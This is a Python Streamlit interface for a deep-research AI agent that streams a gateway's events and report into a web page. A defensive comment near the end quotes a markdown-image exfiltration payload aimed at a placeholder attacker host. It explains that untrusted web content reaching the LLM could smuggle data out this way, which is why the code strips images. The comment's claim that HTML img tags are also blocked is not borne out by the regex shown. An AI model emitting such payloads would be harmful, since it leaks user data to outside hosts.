"""研知 · Deep Research Agent —— Streamlit 界面（事件契约的首个消费端）。

为什么是"后台线程 + 事件队列轮询"：Streamlit 每次交互都会重跑整个脚本，
同步跑长任务会把页面锁死——老项目踩过的坑，这里复用"后台任务 + 轮询"
模式，只是数据源从 HTTP 轮询换成了进程内事件队列（QueueSink）。

D8 起有两种数据源（UI_MODE 开关，PLAN §3.1 三端共用契约）：
  - gateway（默认）：读 FastAPI SSE 网关，UI 是纯 HTTP 客户端——
    与 Next.js 消费同一条流，这是"三端共用契约"叙事的主路径；
  - inline：进程内直调 run_research（D5 原模式，SSE 卡壳时的砍线兜底）。
两种模式喂给 UI 的都是同一个 QueueSink，live_panel 一行不用改。

启动（项目根目录，gateway 模式先起网关）：
    /opt/anaconda3/envs/agent-research/bin/uvicorn api.main:app --port 8000
    /opt/anaconda3/envs/agent-research/bin/streamlit run frontend/app.py
"""
from __future__ import annotations

import json
import os
import queue
import re
import sys
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # streamlit 只加脚本目录进 sys.path

import requests  # noqa: E402
import streamlit as st  # noqa: E402

from app.contracts import (  # noqa: E402
    EVENT_DONE,
    EVENT_ERROR,
    EVENT_REPORT_DELTA,
    EVENT_REPORT_RESET,
    EVENT_RESEARCH_STARTED,
    AgentEvent,
)
from app.graph.build import run_research  # noqa: E402

UI_MODE = os.getenv("UI_MODE", "gateway")  # gateway | inline
GATEWAY_URL = os.getenv("GATEWAY_URL", "http://127.0.0.1:8000").rstrip("/")

# 报告渲染前剥 markdown 图片：`![alt](url)` 与 HTML img 一律屏蔽
_IMG_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")

st.set_page_config(page_title="研知 · Deep Research Agent", page_icon="🔬", layout="wide")


class QueueSink:
    """把图的事件流推进线程安全队列，UI 端轮询消费（跨线程的事件契约）。"""

    def __init__(self) -> None:
        self.q: queue.Queue[AgentEvent] = queue.Queue()

    def emit(self, event: AgentEvent) -> None:
        self.q.put(event)


def _consume_gateway(question: str, focus: str, sink: QueueSink) -> None:
    """SSE 客户端：把网关下发的契约事件逐帧转回 AgentEvent 推进队列。

    为什么逐行解析而不是引 SSE 库：协议就一行一个 `data: {json}`，
    三十行代码换零依赖，冲刺期划算。任何传输层异常都转成 EVENT_ERROR
    入队——UI 的终止逻辑只认事件，不感知传输细节（与 inline 模式对称）。
    """
    try:
        resp = requests.post(
            f"{GATEWAY_URL}/api/research",
            json={"question": question, "focus": focus},
            stream=True,
            timeout=(3, None),  # 读超时必须放开：研究是分钟级长流
        )
        resp.raise_for_status()
        for line in resp.iter_lines(decode_unicode=True):
            if not line.startswith("data: "):
                continue
            data = json.loads(line[len("data: ") :])
            sink.emit(
                AgentEvent(
                    type=data["type"], payload=data.get("payload", {}), ts=data.get("ts", 0.0)
                )
            )
    except requests.RequestException as exc:
        sink.emit(
            AgentEvent(
                EVENT_ERROR,
                {
                    "code": "gateway_unreachable",
                    "msg": f"网关不可达（{type(exc).__name__}）：先启动 "
                    f"uvicorn api.main:app（GATEWAY_URL={GATEWAY_URL}），"
                    "或把 UI_MODE 改为 inline 直调进程内图",
                },
            )
        )


for key, default in {
    "thread": None,
    "sink": None,
    "report_text": "",
    "done": False,
    "error": None,
    "mode": "",
    "events": [],
    "citation": None,
}.items():
    if key not in st.session_state:
        st.session_state[key] = default

st.title("🔬 研知 · Deep Research Agent")
st.caption("规划 → 混合检索 → 验证回环 → 带引用报告｜事件契约 v1 实时呈现")

question = st.text_input(
    "研究问题",
    placeholder="例：LangGraph 和手写 Agent 循环哪个更适合生产？",
)
focus = st.text_input("关注点（可选）", placeholder="例：本地 CPU 部署")
running = st.session_state.thread is not None and st.session_state.thread.is_alive()
if st.button("开始研究", type="primary", disabled=running or not question.strip()):
    st.session_state.sink = QueueSink()
    st.session_state.report_text = ""
    st.session_state.done = False
    st.session_state.error = None
    st.session_state.mode = ""
    st.session_state.events = []
    st.session_state.citation = None
    # UI_MODE 决定数据源：gateway=SSE 客户端（主路径），inline=进程内直调（砍线兜底）。
    # 两个 target 的签名刻意对齐（question, focus, sink），切换零胶水
    target = _consume_gateway if UI_MODE == "gateway" else run_research
    st.session_state.thread = threading.Thread(
        target=target,
        args=(question.strip(), focus.strip(), st.session_state.sink),
        daemon=True,
    )
    st.session_state.thread.start()

st.divider()
status_ph = st.empty()
mode_ph = st.empty()
report_ph = st.empty()
side_ph = st.container()


@st.fragment(run_every="1s")
def live_panel() -> None:
    """每秒取空事件队列：报告逐字增长，过程事件即时可见。"""
    sink = st.session_state.sink
    if sink is None:
        return
    while True:
        try:
            event = sink.q.get_nowait()
        except queue.Empty:
            break
        if event.type == EVENT_REPORT_DELTA:
            st.session_state.report_text += str(event.payload.get("text", ""))
        elif event.type == EVENT_REPORT_RESET:
            # 流式断流降级的清场信号：残文不清，降级全文就会拼在半截后面
            st.session_state.report_text = ""
            st.session_state.events.append(event)
        elif event.type == EVENT_DONE:
            st.session_state.done = True
            st.session_state.citation = event.payload.get("citation_report")
        elif event.type == EVENT_RESEARCH_STARTED:
            st.session_state.mode = str(event.payload.get("provider_mode", ""))
            st.session_state.events.append(event)
        elif event.type == EVENT_ERROR:
            # 后台线程崩掉时这是唯一能到达 UI 的失败信号（评审 P0-3）；
            # 同时进 events 列表，让过程面板里也能看到错误现场
            st.session_state.error = str(event.payload.get("msg", "未知错误"))
            st.session_state.events.append(event)
        else:
            st.session_state.events.append(event)

    alive = st.session_state.thread is not None and st.session_state.thread.is_alive()
    if st.session_state.error:
        status_ph.error(f"❌ 研究失败：{st.session_state.error}")
    elif st.session_state.done:
        status_ph.success("✅ 研究完成")
    elif alive:
        status_ph.info(
            f"⏳ 研究中…（事件 {len(st.session_state.events)} 条，"
            f"报告 {len(st.session_state.report_text)} 字）"
        )
    else:
        status_ph.info("输入问题，点「开始研究」")

    # fake 模式的证据长得跟真的一样（example.com 除外），不讲明来源，
    # 现场演示忘切配置就会拿固定台词当真数据（评审 P2-10）
    if st.session_state.mode == "fake":
        mode_ph.warning(
            "🧪 离线演示模式（PROVIDER_MODE=fake）：以下证据与报告基于固定示例数据，非真实检索"
        )
    else:
        mode_ph.empty()

    with side_ph:
        with st.expander("⚙️ 研究过程事件（实时）", expanded=not st.session_state.done):
            for event in st.session_state.events[-25:]:
                st.caption(f"`[{event.type}]` {event.payload}")
        if st.session_state.citation:
            c = st.session_state.citation
            st.caption(
                f"📎 引用对账：出现 {c['refs_total']} 次 / 去重 {c['refs_unique']} 个 / "
                f"可映射 {c['mapped']} 个｜证据 {c['evidence_total']} 条"
                + (f"｜⚠️ 幻觉引用：{c['unmapped']}" if c["unmapped"] else "")
            )

    if st.session_state.report_text:
        tail = " ▌" if alive and not st.session_state.done else ""
        # 剥外链图片语法再渲染：报告由不可信网页喂出来的 LLM 生成，
        # 一张 ![](http://attacker/pixel?data=...) 就是现成的数据外泄通道（评审 P2-13）
        report_ph.markdown(_IMG_RE.sub("[图片已屏蔽]", st.session_state.report_text) + tail)


live_panel()
